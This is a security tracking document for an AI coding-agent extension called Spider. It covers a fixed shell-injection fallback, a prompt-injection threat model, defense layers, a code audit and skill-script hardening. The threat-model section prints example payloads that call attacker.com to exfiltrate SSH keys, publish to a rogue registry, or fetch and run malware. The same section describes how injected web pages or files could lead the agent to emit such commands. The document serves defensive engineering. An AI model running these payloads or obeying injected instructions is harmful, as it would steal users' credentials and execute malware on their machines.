# Command Execution Security Risk

> Spider security tracking document.
> Created: 2026-10-04. Addresses the shell:true fallback vulnerability.

---

## Risk

Legacy command execution could reach `shell: true` when `ExecutionContext` was absent.

A model-supplied command string — which is completely untrusted input — was
passed directly to Node.js `spawn()` with `{ shell: true }` whenever the
`ExecutionContext` was missing, not resolved, or not propagated by a caller.

---

## Threat Model

The primary threat actor is **prompt injection**: a malicious instruction
injected into the agent's context (via a webpage fetched by `fetch_url`, a
file read from the workspace, a tool result, or a crafted user message) could
cause the LLM to emit a `run_command` tool call containing shell metacharacters
designed to execute additional commands.

Examples of dangerous payloads that would have been interpreted by the shell
under `shell: true`:

```
echo ok && curl -s http://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)
echo ok; npm publish --registry https://attacker.com
$(wget http://attacker.com/malware.sh -O /tmp/x && bash /tmp/x)
```

The model does not need to "intend" to execute these; it only needs to include
them in the `command` field of a `run_command` tool call.

**Trusted input assumption that must NOT be made:**
- The model is not trusted.
- Tool call arguments are not trusted.
- Workspace file contents are not trusted.
- Web content fetched by `fetch_url` is not trusted.
- Any value that flows from LLM output → tool argument → execution layer
  must be treated as untrusted.

---

## Impact

If `shell: true` could be reached with a model-supplied command string:

- **Shell injection** via `&&`, `;`, `|`, `$()`, `` `` ``, `>`, `>>` etc.
- **Command chaining**: malicious secondary commands run with the same
  permissions as the VS Code extension host (the user's account).
- **Data exfiltration**: reading files, environment variables, secrets and
  sending them to an external endpoint.
- **Workspace destruction**: `rm -rf`, `git reset --hard`, bulk deletes.
- **Credential theft**: reading `~/.ssh/`, `~/.npmrc`, `~/.gitconfig` etc.

---

## Root Cause

`ExecutionContext` was treated as optional throughout the execution pipeline:

1. `RunCommandOptions.context` was typed `?: ExecutionContext` in
   `commandRunner.ts`.

2. `BackgroundProcessStartRequest.context` was typed `?: ExecutionContext` in
   `backgroundProcessManager.ts`.

3. `WorkspaceToolExecutor.resolveExecution()` returned
   `{ directory: hostDirectory }` (no context) when `executionManager` was
   absent, silently falling through to the `shell: true` path.

4. `runTestsTool.resolveExecution()` returned `{ directory: hostDirectory }`
   when `executionManager` was absent.

The net result: any code path that reached `commandRunner` without an
`executionManager` would silently use `shell: true`.

---

## Security Invariant (Post-Fix)

```
NO VALID EXECUTION CONTEXT
        ↓
FAIL CLOSED (throw ExecutionContextError / ToolExecutionError)
        ↓
DO NOT EXECUTE
```

This is enforced at **multiple independent layers**:

1. **TypeScript type system**: `context` is now a required field in
   `RunCommandOptions` and `BackgroundProcessStartRequest`.

2. **Runtime validation**: both `runWorkspaceCommand()` and
   `BackgroundProcessManager.start()` perform explicit runtime checks on the
   `context` parameter and throw `ExecutionContextError` if it is absent,
   null, or not an object. This catches JavaScript callers, cast types, and
   configuration paths that bypass TypeScript.

3. **Caller enforcement**: `WorkspaceToolExecutor.resolveExecution()` throws
   `ToolExecutionError("dependency_unavailable")` when `executionManager` is
   absent. `runTestsTool.resolveExecution()` does the same.

4. **No fallback path exists**: the `else { shell: true }` branch has been
   removed from `commandRunner.ts`. There is no code path that reaches
   `spawn()` without a validated `ExecutionContext`.

---

## Remediation

### Files Changed

| File | Change |
|------|--------|
| `src/runtime/tools/commandRunner.ts` | `context` made required; runtime validation added; `shell: true` fallback removed |
| `src/runtime/tools/backgroundProcessManager.ts` | `context` made required in `BackgroundProcessStartRequest`; runtime validation added; context-absent spawn fallback removed |
| `src/runtime/tools/workspaceToolExecutor.ts` | `resolveExecution()` throws when `executionManager` absent; return type is now `{ context: ExecutionContext; directory: string }` |
| `src/runtime/tools/runTestsTool.ts` | `resolveExecution()` throws when `executionManager` absent; return type is now `{ context: ExecutionContext; directory: string }` |

### Tests Changed

| File | Change |
|------|--------|
| `test/unit/runtime/tools/commandRunner.output.test.ts` | Updated to provide required context; added fail-closed assertion |
| `test/unit/runtime/tools/backgroundProcessManager.test.ts` | All `start()` calls updated to provide `context` |
| `test/unit/runtime/tools/phase2Tools.integration.test.ts` | `executionManager` added to `WorkspaceToolExecutor` setup |
| `test/unit/runtime/tools/phase3Tools.integration.test.ts` | `executionManager` added to `WorkspaceToolExecutor` setup |
| `test/unit/runtime/tools/phase5Tools.integration.test.ts` | `executionManager` added to `WorkspaceToolExecutor` setup |
| `test/unit/runtime/tools/runTestsTool.test.ts` | `executionManager` added to all `runTests()` dep objects |
| `test/unit/runtime/tools/workspaceToolExecutor.test.ts` | Rewritten to use `makeExecutor()` with real `ExecutionManager` |

### Tests Added

| File | Coverage |
|------|---------|
| `test/unit/runtime/execution/shellInjectionSecurity.test.ts` | 30+ injection payloads × 4 backends (bash/cmd/PowerShell/WSL); fallback-path fail-closed tests for all execution entry points; permission-gate-before-spawn tests |

---

## Defense in Depth

Spider's command execution security is layered:

### Layer 1 — Permission gate (before execution)

Every tool call passes through `ToolRouter.route()` → `authorize()` before any
execution occurs. The permission system (five categories: READ / MODIFY /
EXECUTE / EXTERNAL / DESTRUCTIVE) makes a hard Allow/Deny decision. A deny
never reaches `commandRunner`. The gate cannot be bypassed by the model.

### Layer 2 — Structured argv execution (at spawn time)

`ExecutionManager.buildCommandInvocation()` constructs an explicit spawn
invocation:

- **bash/sh/zsh**: `spawn(shellPath, ["-c", command], { shell: false })`
- **cmd.exe**: `spawn("cmd.exe", ["/d", "/s", "/c", command], { shell: false })`
- **PowerShell**: `spawn("powershell.exe", ["-NoProfile", "-Command", command], { shell: false })`
- **WSL**: `spawn("wsl.exe", ["-d", distro, "--cd", cwd, "--", shell, "-lc", command], { shell: false })`

The `shell: false` flag is unconditional and hardcoded. Node.js will not
invoke the OS shell to parse the argument array. The model-supplied `command`
is always the **last single argv entry** — it cannot be injected into the
executable position, the shell flags position, or split into multiple
independent commands by the spawn call itself.

Note: the command string is still *evaluated* by the shell (`bash -c "..."`)
because that is the intended behavior for `run_command`. Shell metacharacters
within the string (`&&`, `;`, pipes) are interpreted by the shell. This is why
the permission gate is the primary defense against unwanted commands.

### Layer 3 — ExecutionContext mandatory (configuration correctness)

Every process creation must be backed by a validated `ExecutionContext` derived
from `ExecutionManager.resolve()`. The manager reads authoritative facts from
VS Code (`process.platform`, `vscode.env.remoteName`, `vscode.env.shell`) and
resolves the correct environment deterministically. No component may guess the
shell, platform, or WSL distro. If the context cannot be resolved, execution
fails closed.

### Layer 4 — Workspace path validation (filesystem boundary)

All model-supplied paths pass through `resolveWorkspacePathSafe()` before
any filesystem operation. This performs both a lexical check (`..` escapes)
and a symlink-resolved real-path check. A path that escapes the workspace
boundary throws `ToolExecutionError("workspace_violation")`.

### Layer 5 — run_tests allow-list (surface area reduction)

`run_tests` restricts the executable to a fixed allow-list:
`pnpm`, `npm`, `yarn`, `pytest`, `python`, `python3`, `cargo`, `go`.
The runner is validated against this list before any spawn is attempted.
Arguments are passed as argv (never shell-interpolated).

### Layer 6 — SSRF protection (network boundary)

`fetch_url` validates URLs before any network request: HTTPS-only for the
public web (plain http is rejected unless the destination is loopback under
the opt-in below), blocks private/RFC1918/CGNAT/link-local/metadata addresses
by literal AND by DNS resolution on the original URL and on every redirect hop
(DNS is re-resolved per hop). Loopback (`localhost`, `127.0.0.0/8`, `::1`) is
denied by default and reachable over http(s) only when the
`spider.fetch.allowLocalNetwork` setting (default `false`) opts in. Every
successful result discloses its destination (`destination: "loopback" |
"public"` plus a `destination: loopback` notice for local-machine responses).

### Layer 7 — Cancellation and timeout (denial-of-service mitigation)

Every process has a bounded lifetime: `commandRunner` enforces a default
120-second timeout; `BackgroundProcessManager.whenClosed()` accepts a
`timeoutMs`; `run_tests` caps at 300 seconds. `AbortSignal` propagation
allows the agent to cancel running processes on user request.

---

## Remaining Risks

### DNS rebinding (TOCTOU) in fetch_url

DNS is resolved once per hop, immediately before that hop's request
(re-resolution already happens on the original URL and on every redirect
target), but the checked address is not pinned to the TCP connect. A hostile
DNS server can serve a benign address at check time and a private/loopback
address at connect time (short TTL + rapid record swap); eliminating the race
would require connection-level IP pinning the current `fetch`-based transport
does not provide.
This is documented in `urlSecurity.ts`. Mitigation: loopback is denied by
default (`spider.fetch.allowLocalNetwork`, default `false`), so a rebinding
attack cannot reach the local machine unless the user explicitly opts in;
LAN/metadata ranges stay unreachable either way, and the `external`
permission still gates every request.

### Prompt injection is not fully preventable by structural controls

Removing `shell: true` eliminates the *mechanism* for injection-as-syntax in
the spawn call. It does not prevent the model from being prompted to emit
commands like `rm -rf /` or `git push --force --all`. Those commands are
structurally valid and will pass through `bash -c "rm -rf /"` after the
permission gate approves them.

**Mitigation layers:**
- `DESTRUCTIVE_COMMAND_PATTERNS` in `permissionPolicy.ts` catches common
  destructive patterns (`rm -f`, `git reset --hard`, `DROP DATABASE`, etc.)
  and escalates them to `DESTRUCTIVE` category (always prompts user).
- The permission gate requires explicit user approval for EXECUTE and
  DESTRUCTIVE categories by default.
- The runtime auto-approve shield cannot override destructive requests.

**Remaining gap:** `DESTRUCTIVE_COMMAND_PATTERNS` is a static list and will
not catch every dangerous command (`find . -delete`, `git push --force`,
`npm run clean`, PowerShell equivalents, etc.).

### No process sandbox

The extension host process runs as the user's account. Commands launched by
Spider inherit those permissions. There is no OS-level sandbox (seccomp,
AppArmor, pledge, etc.) around spawned processes. A command approved by the
user (or auto-approved) can do anything the user can do.

### Background process output is in-memory only

Process output is retained in a rolling buffer (64k chars per stream). It is
not persisted across extension reloads. Long-running processes whose output
exceeds the buffer have their oldest output silently dropped.

### gitStatusTool direct spawn

`gitStatusTool.ts` uses a direct `spawn()` call (not through `CommandRunner`)
with `shell: false`. This is an intentional trusted-internal path: the git
executable and all argument arrays are hardcoded by the tool, never
model-supplied. The risk is low, but it represents a second spawn site that
is not routed through `ExecutionManager`. It does not resolve a WSL context,
which means git commands always run in the extension host's native environment
(correct for most workspaces, but potentially wrong for WSL workspaces where
the git repo lives inside the distro).

---

## Recommended Next Security Improvements

1. **Route `gitStatusTool` through `ExecutionManager`** — so git commands
   execute in the correct WSL/remote environment and the spawn is centrally
   audited.

2. **Expand `DESTRUCTIVE_COMMAND_PATTERNS`** — add `find . -delete`,
   `git push --force`, `git push -f`, `git branch -D`, `chmod -R 777`,
   `chown -R`, and PowerShell equivalents (`Remove-Item -Recurse`, etc.).

3. **Add a command AST / policy evaluation layer** — parse the model-supplied
   command string into an AST (using a shell parser) and evaluate it against a
   policy before passing it to the shell. This would catch compound commands,
   subshell substitutions, and redirections at the syntax level, not pattern
   matching.

4. **Process sandboxing** — investigate OS-level sandboxing for spawned
   processes: `seccomp-bpf` on Linux, macOS sandbox profiles, Windows job
   objects. This would limit what a successfully-injected command can do even
   if it passes the permission gate.

5. **Command audit logging** — log every approved command execution (tool
   name, command, cwd, exit code, duration) to a tamper-evident log, excluding
   environment variables and sensitive arguments. This supports post-incident
   forensics.

6. **`run_command` command-parsing improvement** — currently the model
   supplies a shell command string that is passed verbatim to `bash -c`. A
   future improvement would parse the string into an executable + argv array
   (using a real shell parser), validate it against a policy, and launch it
   with `shell: false`. This would provide structural injection prevention at
   the shell-expression level, not just at the spawn API level.

---

## Coverage Audit (verified 2026-10-10 against codebase)

> Code-to-doc audit. `✅ COVERED` = verified in code. `❌ OPEN` = documented but not implemented.

### Root Cause — ✅ ALL COVERED

| # | Claim | Status | Evidence |
|---|-------|--------|----------|
| 1 | `RunCommandOptions.context` was optional | ✅ COVERED | `src/runtime/tools/commandRunner.ts:40` — `readonly context: ExecutionContext` (required); runtime guard `53-59` throws `ExecutionContextError` |
| 2 | `BackgroundProcessStartRequest.context` was optional | ✅ COVERED | `src/runtime/tools/backgroundProcessManager.ts:72` (required); runtime guard `192-199` throws `ExecutionContextError`, no spawn |
| 3 | `WorkspaceToolExecutor.resolveExecution()` silent fallback | ✅ COVERED | `src/runtime/tools/workspaceToolExecutor.ts:729-749` — throws `ToolExecutionError(dependency_unavailable)` when `executionManager` absent; returns `{context, directory}` |
| 4 | `runTestsTool.resolveExecution()` silent fallback | ✅ COVERED | `src/runtime/tools/runTestsTool.ts:336-357` — same fail-closed throw |
| — | No `shell:true` path remains | ✅ COVERED | 0 hits for `shell: true` in `src/`; `executionManager.ts:130-212` (`buildCommandInvocation` + `buildArgvInvocation`) hardcode `shell: false` for bash/cmd/PowerShell/WSL |

### Security Invariant (4 enforcement layers) — ✅ ALL COVERED

| Layer | Status | Evidence |
|-------|--------|----------|
| 1. Type system (required `context`) | ✅ COVERED | `commandRunner.ts:40`, `backgroundProcessManager.ts:72` |
| 2. Runtime validation | ✅ COVERED | `commandRunner.ts:53-59`, `backgroundProcessManager.ts:192-199` |
| 3. Caller enforcement | ✅ COVERED | `workspaceToolExecutor.ts:733-739`, `runTestsTool.ts:341-347` |
| 4. No fallback branch | ✅ COVERED | `else {shell:true}` removed; no spawn without validated context |

### Remediation files — ✅ ALL COVERED

All 4 source files + all 7 test files + `shellInjectionSecurity.test.ts` exist (`test/unit/runtime/execution/shellInjectionSecurity.test.ts:1-100` confirms argv-only, fail-closed, per-entry-point coverage).

### Defense in Depth (7 layers) — ✅ ALL COVERED

| Layer | Status | Evidence |
|-------|--------|----------|
| 1. Permission gate before execution | ✅ COVERED | `src/runtime/tools/toolRouter.ts:49-52` — `authorize()` deny returns `permission_denied`, never reaches runner |
| 2. Structured argv (`shell:false`) | ✅ COVERED | `executionManager.ts:141-178,205-211`; caveat in doc is accurate: `run_command` string still evaluated by `bash -c`, so gate is primary defense |
| 3. Mandatory ExecutionContext | ✅ COVERED | `executionManager.ts:70-112` single authority from host facts |
| 4. Workspace path validation | ✅ COVERED | `workspacePath.ts:10-44` lexical + `fs.realpath` symlink check → `workspace_violation` |
| 5. `run_tests` allow-list | ✅ COVERED | `runTestsTool.ts:29-38` (`pnpm,npm,yarn,pytest,python,python3,cargo,go`), argv-only |
| 6. SSRF protection | ✅ COVERED | `net/urlSecurity.ts:35,48-80` HTTPS-only, blocked hosts/suffixes, DNS per redirect |
| 7. Timeout/cancel | ✅ COVERED | `commandRunner` 120s default; `runTests` 120s/300s max; `BackgroundProcessManager` 10s startup, 64k buffer, 50 retained; `AbortSignal` throughout |

### Remaining Risks — ✅ ACCURATELY DOCUMENTED (accepted, not fixed)

DNS-rebinding TOCTOU, prompt-injection via structurally-valid commands, no OS sandbox, 64k in-memory rolling buffer, `gitStatusTool.ts:307-312` direct `spawn(git,…,shell:false)` bypassing `ExecutionManager`/WSL — all confirmed true in code. `DESTRUCTIVE_COMMAND_PATTERNS` (`permissionPolicy.ts:195-207`, 11 regexes) confirmed static/incomplete as doc admits.

### Recommended Next Improvements — ❌ ALL OPEN (0/6 done)

| # | Item | Status |
|---|------|--------|
| 1 | Route `gitStatusTool` through `ExecutionManager` | ❌ OPEN — still direct `spawn` |
| 2 | Expand `DESTRUCTIVE_COMMAND_PATTERNS` | ❌ OPEN — still 11 patterns |
| 3 | Command AST / policy layer | ❌ OPEN |
| 4 | Process sandboxing | ❌ OPEN |
| 5 | Command audit logging | ❌ OPEN |
| 6 | `run_command` argv parsing (`shell:false` at expression level) | ❌ OPEN — still `bash -c` verbatim |

**Summary: core vulnerability + all 4 invariant layers + all 7 defense layers = ✅ COVERED. All 6 hardening follow-ups = ❌ OPEN.**

---

## Agent Skills Script Execution Security Hardening (Step 4 Focused Security Review)

> Verified: 2026-10-10 against `src/runtime/tools/skillTools.ts`, `src/runtime/tools/commandRunner.ts`, `src/runtime/skills/skillSecurity.ts`, and `src/runtime/runtimeManager.ts`.

### 1. Process Invocation & Shell Elimination
- **Argv-Only Process Creation (`shell: false`)**: `run_skill_script` uses `runWorkspaceArgvCommand(RunArgvCommandOptions)` instead of passing concatenated strings to shell interpreters.
- **Explicit Interpreter Mapping**:
  - `.py` → `python`
  - `.sh`, `.bash` → `bash`
  - `.js`, `.mjs`, `.cjs` → `node`
  - `.ts` → `node --loader tsx`
- **Shell Injection Resistance**: Arguments containing `;`, `&&`, `|`, `$(...)`, `` `...` ``, `>`, `%VAR%` are passed as discrete elements in the `argv` array to `child_process.spawn(..., { shell: false })`. Metacharacters are treated solely as literal argument strings, completely preventing secondary command execution.

### 2. Environment Sanitization & Isolation Boundary
- **Sanitized Child Environment**: `sanitizeSkillScriptEnvironment()` purges all known credential patterns (`API_KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `OPENAI`, `ANTHROPIC`, `GITHUB`, `AZURE`, etc.) and permits only safe runtime keys (`PATH`, `USER`, `TEMP`, `SYSTEMROOT`, etc.).
- **Defense-in-Depth Guarantee**: Environment filtering restricts secret exposure, but is explicitly **NOT a full OS sandbox**. On local hosts, the child process runs with the privileges of the active user. True isolation requires WSL (`backend: "wsl"`) or containerization (Docker).
- **Explicit Environment Labeling**: Approval prompts and permission requests explicitly label the execution environment (`host execution (non-sandboxed)` vs `WSL (<distro>)` vs `remote (<authority>)`).

### 3. Filesystem TOCTOU & Canonical Validation
- **File Handle Atomicity**: `readSkillResource` uses `fs.open()` to obtain an open file descriptor, then executes `handle.stat()` and `handle.readFile()` on that same descriptor, eliminating user-space symlink swap races between check and read.
- **Residual TOCTOU Limitation**: For script execution (`run_skill_script`), `fs.realpath()` and lexical containment are verified prior to spawn. On concurrent or shared filesystems where untrusted local processes have write access to the script directory, a window between canonical validation and interpreter open exists at the OS level. This is mitigated by restricting script location to `scripts/` within the skill directory and requiring workspace trust.

### 4. Approval Integrity
- **Mandatory User Approval**: `run_skill_script` is strictly assigned to the `EXECUTE` permission category. It is never auto-allowed by policy (`shouldAutoAllow` returns `false`).
- **Complete Request Disclosure**: The permission prompt displays `[skill:<name>] <script> [cwd: <workspace>] [env: <isolation-label>]` with all arguments included and sensitive tokens redacted (`redactSensitiveString`).


